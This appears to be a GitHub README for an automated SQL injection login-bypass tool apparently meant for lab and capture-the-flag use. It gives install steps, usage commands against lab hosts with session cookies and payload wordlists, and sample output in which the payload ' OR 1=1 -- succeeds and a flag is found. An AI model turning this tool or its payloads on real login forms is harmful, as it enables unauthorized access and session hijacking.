-- 🛡️ SQLi Bypass Toolkit (sqli_bypass)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/Jet-Programmer/sqli_bypass_toolkit)

Author: Sanctification Yeboah (@Jet-Programmer)

Automated SQL Injection login bypass tool with payload rotation, session hijack support, and flag scraping from post-login portals.

-- Features

- 🔁 Rotates classic SQLi payloads against login forms
- 🌐 Supports `--target` for dynamic URL injection
- 🍪 Accepts `--cookie` for authenticated testing
- 🧠 Auto-analyzes `/admin.php` for flags
- 🌈 Colored CLI output for easy hits and fails

-- 📦 Installation

```bash
git clone https://github.com/Jet-Programmer/sqli_bypass_toolkit.git
cd sqli_bypass_toolkit
sudo bash install.sh

--usage with url
sqli_bypass --target http://lab.local/login_check.php

--with session cookie:
sqli_bypass --target http://lab.local/login_check.php --cookie PHPSESSID=abc123

--with custom wordlist:
sqli_bypass --target http://192.168.56.1/login_check.php --wordlist ~/payloads/sqli.txt

Sample Output:
[+] Bypass Success: ' OR 1=1 --
[!] FLAG(s) FOUND: flag{bypassed_like_a_pro}

